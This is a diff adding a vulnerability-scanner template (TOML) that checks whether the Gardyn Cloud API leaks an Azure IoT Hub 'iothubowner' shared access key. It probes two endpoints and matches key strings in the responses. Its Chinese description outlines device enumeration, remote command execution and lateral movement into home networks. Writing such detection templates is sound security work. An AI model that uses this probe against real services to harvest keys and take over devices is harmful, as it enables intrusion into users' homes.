@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "检测 Gardyn Cloud API 是否暴露 Azure IoT Hub iothubowner 高权限密钥。获取该密钥后可调用 IoTHubRegistryManager 枚举全部注册设备（138,160+ 台），通过 Cloud-to-Device 直接方法在目标设备上执行任意命令，并以此为跳板横向渗透用户家庭内网。"
+id = "POC-AVE-2026-0058"
+name = "Gardyn IoT Hub 硬编码 iothubowner 密钥 PoC"
+severity = "critical"
+tags = ["ave-2026-0058"]
+vuln_id = [
+    "CVE-2026-13768",
+    "AVE-2026-0058",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/device/connection-info"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "HostName=",
+    "SharedAccessKey=",
+    "iothubowner",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/config"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "HostName=",
+    "SharedAccessKey=",
+    "iothubowner",
+]
